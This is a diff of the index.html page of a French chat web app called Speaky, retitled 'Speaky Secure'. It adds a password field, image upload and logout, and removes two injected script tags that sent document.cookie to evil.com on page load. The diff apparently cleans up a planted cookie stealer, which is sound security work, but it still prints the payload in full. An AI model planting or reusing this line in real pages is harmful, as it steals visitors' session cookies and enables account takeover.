@@ -1,80 +1,72 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Chat en direct - Discutez en temps réel.">
-    <meta property="og:title" content="Chat en Direct">
-    <meta property="og:description" content="Discutez avec vos amis en temps réel.">
-    <meta property="og:image" content="public/chat-preview.png">
-    <meta property="og:type" content="website">
-
-    <!-- Liens pour les icones  -->
-    <script src="https://kit.fontawesome.com/d2592aca38.js" crossorigin="anonymous"></script>
-
-    <title>Speaky</title>
+    <title>Speaky Secure</title>
     <link rel="stylesheet" href="style.css">
-    <script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>
+    <script src="https://kit.fontawesome.com/d2592aca38.js" crossorigin="anonymous"></script>
 </head>
-
 <body>
     <div id="app-container">
         <header>
-            <h1><i class="fa-regular fa-comment"></i> Speaky</h1> 
-           <!-- <div class="container">
-                <button class="send-message" id="green-led"><span class="Vert">Led-Vert</span></button>
-                <button class="send-message" id="red-led"><span class="Rouge">Led-Rouge</span></button>
-                <button class="send-message" id="blue-led"><span class="Bleu">Led-Bleu</span></button>
-            </div> -->
+            <h1><i class="fa-solid fa-comments"></i> Speaky</h1> 
+            <button id="logout-btn" style="display:none;">Déconnexion</button>
         </header>
 
         <div id="category-controls">
             <select id="category-selector"></select>
-            <input type="text" id="new-category" placeholder="Nouvelle catégorie">
-            <button id="add-category">Ajouter catégorie</button>
+            <input type="text" id="new-category" placeholder="Nouvelle catégorie...">
+            <button id="add-category"><i class="fa-solid fa-plus"></i></button>
         </div>
 
         <main id="main-container">
-            <!-- Zone des messages -->        
-            <div id="chat-container" class="chat-box">
-                <div id="messages-container">
-                    <!-- Ici, les messages seront affichés -->
-                </div>
+            <div id="users-container">
+                <h2><i class="fa-solid fa-users"></i> En ligne</h2>
+                <ul id="user-list"></ul>
             </div>
 
-            <!-- Zone des utilisateurs -->
-            <div id="users-container">
-                <h2><i class="fa-solid fa-user"></i> Utilisateurs</h2>
-                <ul id="user-list">
-                    <!-- Liste des utilisateurs -->
-                </ul>
+            <div id="chat-container">
+                <div id="messages-container"></div>
             </div>
         </main>
 
-        <!-- Zone d'entrée -->
-        <div id="input-container">
-            <input id="message-input" type="text" placeholder="Tapez un message..." aria-label="Saisissez votre message">
+        <div id="input-container" style="display:none;">
+            <label for="image-input" id="upload-btn">
+                <i class="fa-solid fa-paperclip"></i>
+            </label>
+            <input type="file" id="image-input" accept="image/*" style="display: none;">
+            
+            <input id="message-input" type="text" placeholder="Écrivez un message..." autocomplete="off">
             <button id="send-button">Envoyer</button>
         </div>
+        
+        <div id="preview-container" style="display:none;">
+            Image : <span id="file-name"></span> 
+            <button id="cancel-img" style="color:red; background:none; border:none; cursor:pointer;">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
 
-        <form id="messageForm">
-            <label for="nom">Nom:</label>
-            <input type="text" id="nom" placeholder="Nom" required>
-
-            <label for="prenom">Prénom:</label>
-            <input type="text" id="prenom" placeholder="Prénom" required>
-
-            <button id="creer" type="button">Créer user</button>
-            <button id="connexion" type="button">Connexion</button>
-            <button id="colorButton" type="button">Changer de couleur</button>
-        </form>
-        <script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>
+        <div id="auth-container">
+            <h3><i class="fa-solid fa-lock"></i> Connexion</h3>
+            <form id="authForm">
+                <input type="text" id="nom" placeholder="Nom" required>
+                <input type="text" id="prenom" placeholder="Prénom" required>
+                <input type="password" id="password" placeholder="Mot de passe" required>
+                
+                <div class="auth-buttons">
+                    <button id="creer" type="button">S'inscrire</button>
+                    <button id="connexion" type="button">Se connecter</button>
+                </div>
+            </form>
+        </div>
 
         <footer>
-            <p>© 2025 Speaky inc - Tout droit réservé || Ryan Almansa</p>
+            <p>© 2025 Speaky Inc - Sécurisé</p>
         </footer>
     </div>
+    
     <script src="script.js"></script>
 </body>
 </html>
